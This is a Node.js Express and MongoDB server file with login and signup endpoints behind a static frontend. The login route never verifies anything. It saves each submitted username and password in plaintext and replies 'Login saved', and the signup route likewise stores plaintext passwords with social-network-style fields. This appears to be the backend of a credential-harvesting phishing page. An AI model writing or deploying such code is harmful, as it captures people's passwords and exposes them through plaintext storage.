const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static frontend files
app.use(express.static(path.join(__dirname)));

// MongoDB connection
const mongoUri = process.env.MONGODB_URI;
if (!mongoUri) {
  console.error('Missing MONGODB_URI in .env');
  process.exit(1);
}

mongoose
  .connect(mongoUri, { dbName: process.env.MONGODB_DB || undefined })
  .then(() => console.log('MongoDB connected'))
  .catch((err) => {
    console.error('MongoDB connection error:', err.message);
    process.exit(1);
  });

// Schemas
const loginSchema = new mongoose.Schema(
  {
    username: { type: String, required: true },
    password: { type: String, required: true },
  },
  { timestamps: true }
);

const signupSchema = new mongoose.Schema(
  {
    emailOrMobile: { type: String, required: true },
    password: { type: String, required: true },
    fullName: { type: String, required: true },
    username: { type: String, required: true },
  },
  { timestamps: true }
);

const Login = mongoose.model('Login', loginSchema);
const Signup = mongoose.model('Signup', signupSchema);

// Routes
app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ message: 'username and password are required' });
    }
    const doc = await Login.create({ username, password });
    return res.status(201).json({ message: 'Login saved', id: doc._id });
  } catch (err) {
    console.error('POST /api/login error:', err);
    return res.status(500).json({ message: 'Internal server error' });
  }
});

app.post('/api/signup', async (req, res) => {
  try {
    const { emailOrMobile, password, fullName, username } = req.body;
    if (!emailOrMobile || !password || !fullName || !username) {
      return res.status(400).json({ message: 'All fields are required' });
    }
    const doc = await Signup.create({ emailOrMobile, password, fullName, username });
    return res.status(201).json({ message: 'Signup saved', id: doc._id });
  } catch (err) {
    console.error('POST /api/signup error:', err);
    return res.status(500).json({ message: 'Internal server error' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

